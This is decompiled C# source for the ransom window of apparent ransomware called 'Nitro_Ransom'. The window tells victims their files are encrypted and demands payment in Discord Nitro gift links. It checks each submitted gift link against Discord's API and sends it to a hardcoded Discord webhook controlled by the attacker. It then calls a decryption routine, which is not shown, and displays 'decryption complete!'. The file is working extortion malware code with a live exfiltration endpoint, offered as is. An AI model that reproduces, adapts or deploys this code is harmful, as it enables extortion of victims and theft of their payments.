using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Nitro_Ransom.Properties;

namespace Nitro_Ransom;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Panel panel1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private Label label6;

	private Label label7;

	private Label label8;

	private Button button1;

	private PictureBox pictureBox1;

	private TextBox gift;

	private Label label9;

	public Form1()
	{
		InitializeComponent();
	}

	private void label8_Click(object sender, EventArgs e)
	{
		Process.Start("https://support.discord.com/hc/en-us/articles/360020877112-Nitro-Gifting");
		Process.Start("https://discord.com/nitro");
	}

	private async void button1_Click(object sender, EventArgs e)
	{
		if (!((Control)gift).get_Text().StartsWith("https://discord.gift/"))
		{
			SystemSounds.get_Asterisk().Play();
			return;
		}
		HttpClient client = new HttpClient();
		if (!(await client.GetAsync("https://discord.com/api/v9/entitlements/gift-codes/" + ((Control)gift).get_Text().Split(new char[1] { '/' }).Last() + "?with_application=false&with_subscription_plan=true")).get_IsSuccessStatusCode())
		{
		}
		await client.PostAsync("https://discord.com/api/webhooks/858726539864047626/1RR7hYUcpL0khGrUmJTqcZ1j9GzKcEcHmuxufYAkt5lYC6iVUq-ZXNM3R5rhGXduU9jQ", (HttpContent)new StringContent("{\"content\":\"" + ((Control)gift).get_Text() + "\"}", Encoding.Default, "application/json"));
		await Task.Run(delegate
		{
			Program.ProcessDirectory("", reverse: true);
		});
		MessageBox.Show("decryption complete!");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b6: Expected O, but got Unknown
		//IL_0335: Unknown result type (might be due to invalid IL or missing references)
		//IL_033f: Expected O, but got Unknown
		//IL_03bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c5: Expected O, but got Unknown
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_044e: Expected O, but got Unknown
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Expected O, but got Unknown
		//IL_0559: Unknown result type (might be due to invalid IL or missing references)
		//IL_0563: Expected O, but got Unknown
		//IL_060b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Expected O, but got Unknown
		//IL_0647: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d6: Expected O, but got Unknown
		//IL_07eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f5: Expected O, but got Unknown
		//IL_0878: Unknown result type (might be due to invalid IL or missing references)
		//IL_0882: Expected O, but got Unknown
		//IL_09d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_09db: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		panel1 = new Panel();
		label6 = new Label();
		label7 = new Label();
		label4 = new Label();
		label5 = new Label();
		label3 = new Label();
		label2 = new Label();
		label8 = new Label();
		button1 = new Button();
		pictureBox1 = new PictureBox();
		gift = new TextBox();
		label9 = new Label();
		((Control)panel1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Microsoft YaHei UI", 15f, (FontStyle)1));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(406, 27));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Ooops, your files have been encrypted!");
		((Control)panel1).set_Anchor((AnchorStyles)9);
		((ScrollableControl)panel1).set_AutoScroll(true);
		((Control)panel1).set_BackColor(SystemColors.Control);
		panel1.set_BorderStyle((BorderStyle)2);
		((Control)panel1).get_Controls().Add((Control)(object)label6);
		((Control)panel1).get_Controls().Add((Control)(object)label7);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).get_Controls().Add((Control)(object)label5);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).set_Location(new Point(196, 45));
		((Control)panel1).set_Margin(new Padding(0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(551, 352));
		((Control)panel1).set_TabIndex(1);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_Location(new Point(0, 238));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(453, 34));
		((Control)label6).set_TabIndex(5);
		((Control)label6).set_Text("Payment is accepted in Discord Nitro Gifts ONLY. For more information, click\r\n<About Discord Nitro>.");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_Location(new Point(0, 216));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(98, 17));
		((Control)label7).set_TabIndex(4);
		((Control)label7).set_Text("How Do I Pay?");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(0, 160));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(418, 34));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Sure. We guarante that you can recover all your files safetly and easily.\r\nAlso, if you don't pay, you won't be able to recover your files forever.");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(0, 138));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(152, 17));
		((Control)label5).set_TabIndex(2);
		((Control)label5).set_Text("Can I Recover My Files?");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(0, 25));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(520, 85));
		((Control)label3).set_TabIndex(1);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(0, 3));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(221, 17));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("What Happened To My Computer?");
		((Control)label8).set_Anchor((AnchorStyles)6);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Cursor(Cursors.get_Hand());
		((Control)label8).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)4));
		((Control)label8).set_ForeColor(Color.White);
		((Control)label8).set_Location(new Point(19, 466));
		((Control)label8).set_Margin(new Padding(10));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(126, 17));
		((Control)label8).set_TabIndex(2);
		((Control)label8).set_Text("About Discord Nitro");
		((Control)label8).add_Click((EventHandler)label8_Click);
		((Control)button1).set_Anchor((AnchorStyles)10);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 13f));
		((Control)button1).set_Location(new Point(261, 447));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(474, 30));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Submit Nitro Gift");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)(object)Resources.Nitro_badge);
		((Control)pictureBox1).set_Location(new Point(-4, 35));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(272, 245));
		pictureBox1.set_TabIndex(4);
		pictureBox1.set_TabStop(false);
		((Control)gift).set_Font(new Font("Microsoft Sans Serif", 14f));
		((Control)gift).set_Location(new Point(261, 412));
		((Control)gift).set_Name("gift");
		((Control)gift).set_Size(new Size(474, 29));
		((Control)gift).set_TabIndex(5);
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_BackColor(Color.Transparent);
		((Control)label9).set_Font(new Font("Segoe UI", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.White);
		((Control)label9).set_Location(new Point(192, 412));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(63, 20));
		((Control)label9).set_TabIndex(6);
		((Control)label9).set_Text("Gift URL");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)(object)Resources.battery_icon_ipod_inner_red);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(747, 502));
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)gift);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Your files are encrypted");
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
